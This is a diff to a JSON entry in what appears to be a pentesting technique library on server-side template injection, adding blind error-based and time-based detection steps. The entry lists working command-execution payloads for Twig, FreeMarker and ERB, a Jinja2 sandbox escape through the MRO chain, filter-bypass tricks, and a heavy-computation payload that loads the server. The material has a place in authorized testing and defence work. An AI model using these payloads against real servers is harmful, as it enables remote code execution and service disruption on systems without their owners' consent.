@@ -2,14 +2,14 @@
   "id": "injection-ssti-detection",
   "title": "Server-Side Template Injection (SSTI) Detection & Exploitation",
   "category": "injection",
-  "tags": ["ssti", "template-injection", "rce", "jinja2", "twig", "freemarker"],
+  "tags": ["ssti", "template-injection", "rce", "jinja2", "twig", "freemarker", "blind-ssti", "error-based"],
   "applicability": {
     "technologies": ["python-flask", "python-django", "java-spring", "php", "ruby-rails", "node"],
     "contexts": ["form-input", "url-parameter", "api-endpoint", "email-template"],
     "preconditions": ["user-input-in-template", "server-side-rendering"]
   },
   "technique": {
-    "summary": "Detect and exploit SSTI by injecting template syntax into user-controlled input. Different template engines have different syntax, so polyglot payloads help identify the engine. SSTI frequently leads to RCE.",
+    "summary": "Detect and exploit SSTI by injecting template syntax into user-controlled input. Different template engines have different syntax, so polyglot payloads help identify the engine. SSTI frequently leads to RCE. When output is not reflected, use error-based detection (different engines produce distinct errors) or time-based detection via heavy computation payloads (monitor responseTimeMs).",
     "steps": [
       "Inject mathematical expression probes: {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>",
       "If 49 appears in the response, SSTI is confirmed — identify the engine",
@@ -17,7 +17,12 @@
       "Twig (PHP): {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
       "FreeMarker (Java): ${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
       "ERB (Ruby): <%= system('id') %>",
-      "Escalate from information disclosure to RCE via engine-specific gadget chains"
+      "Escalate from information disclosure to RCE via engine-specific gadget chains",
+      "If no reflection: inject error-provoking payloads and compare error responses per engine",
+      "Jinja2 error probe: {{[].pop()}} triggers IndexError; Twig: {{1/0}} vs Jinja2 {{1/0}} produce different error signatures",
+      "FreeMarker error probe: ${undeclaredVar} triggers InvalidReferenceException",
+      "Time-based blind detection: inject heavy computation payload and monitor responseTimeMs for delay",
+      "Jinja2 time-based: {{range(99999999)|join('')}} causes measurable delay if SSTI is present"
     ],
     "payloads": [
       {
@@ -49,18 +54,45 @@
         "encoding": "raw",
         "context": "form-input",
         "notes": "ERB (Ruby) command execution via backticks"
+      },
+      {
+        "payload": "{{[].pop()}}",
+        "encoding": "raw",
+        "context": "form-input",
+        "notes": "Jinja2 blind detection — triggers IndexError (pop from empty list)"
+      },
+      {
+        "payload": "{{1/0}}",
+        "encoding": "raw",
+        "context": "form-input",
+        "notes": "Error-based engine fingerprinting — Jinja2 returns ZeroDivisionError, Twig returns INF"
+      },
+      {
+        "payload": "${undeclaredVar}",
+        "encoding": "raw",
+        "context": "form-input",
+        "notes": "FreeMarker blind detection — triggers InvalidReferenceException"
+      },
+      {
+        "payload": "{{range(99999999)|join('')}}",
+        "encoding": "raw",
+        "context": "form-input",
+        "notes": "Jinja2 time-based blind detection — heavy computation causes measurable delay in responseTimeMs"
       }
     ],
     "bypassTechniques": [
       "URL-encode template delimiters: %7B%7B7*7%7D%7D",
       "Use alternative Jinja2 syntax: {% print 7*7 %}",
       "Bypass sandboxes via MRO chain: ''.__class__.__mro__[1].__subclasses__()",
-      "Use attr() filter in Jinja2 to bypass dot-notation restrictions"
+      "Use attr() filter in Jinja2 to bypass dot-notation restrictions",
+      "Error-based detection for blind SSTI: compare error responses across engines to fingerprint without reflection",
+      "Time-based detection via heavy computation: use responseTimeMs to detect processing delays from payloads like {{range(N)|join('')}}"
     ]
   },
   "references": [
     "https://portswigger.net/web-security/server-side-template-injection",
-    "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
+    "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection",
+    "https://portswigger.net/research/top-10-web-hacking-techniques-of-2025"
   ],
   "source": "portswigger-research"
 }
